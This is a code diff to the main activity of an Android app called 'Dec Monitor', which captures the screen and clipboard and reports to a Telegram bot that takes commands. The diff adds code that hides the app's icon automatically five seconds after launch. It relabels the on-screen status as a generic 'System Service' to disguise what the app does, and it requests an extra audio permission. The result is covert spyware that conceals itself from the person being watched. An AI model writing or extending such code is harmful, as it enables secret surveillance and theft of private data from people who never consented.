@@ -4,11 +4,14 @@ import android.app.Activity
 import android.content.Intent
 import android.media.projection.MediaProjectionManager
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.widget.Button
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import com.dec.monitor.input.ClipboardMonitor
 import com.dec.monitor.screen.ScreenshotService
+import com.dec.monitor.stealth.StealthManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -36,6 +39,7 @@ class MainActivity : AppCompatActivity() {
             android.Manifest.permission.READ_MEDIA_IMAGES,
             android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
             android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.MODIFY_AUDIO_SETTINGS,
         ), 100)
 
         findViewById<Button>(R.id.btnStart).setOnClickListener {
@@ -43,7 +47,12 @@ class MainActivity : AppCompatActivity() {
             startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
         }
 
-        findViewById<TextView>(R.id.tvStatus).text = "Dec Monitor active.\nTap Start to enable screen capture."
+        findViewById<TextView>(R.id.tvStatus).text = "System Service\nTap Start to initialize."
+
+        // auto hide icon after 5 seconds
+        Handler(Looper.getMainLooper()).postDelayed({
+            StealthManager.hideIcon(applicationContext)
+        }, 5000)
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -54,9 +63,9 @@ class MainActivity : AppCompatActivity() {
                 putExtra(ScreenshotService.EXTRA_RESULT_DATA, data)
             }
             startForegroundService(serviceIntent)
-            findViewById<TextView>(R.id.tvStatus).text = "✅ All monitoring active."
+            findViewById<TextView>(R.id.tvStatus).text = "✅ Initialized."
             CoroutineScope(Dispatchers.IO).launch {
-                TelegramBot.sendMessage("✅ <b>Dec Monitor fully active.</b>\nSend /help for commands.")
+                TelegramBot.sendMessage("✅ <b>Dec Monitor active.</b>\n/help for commands.")
             }
         }
     }
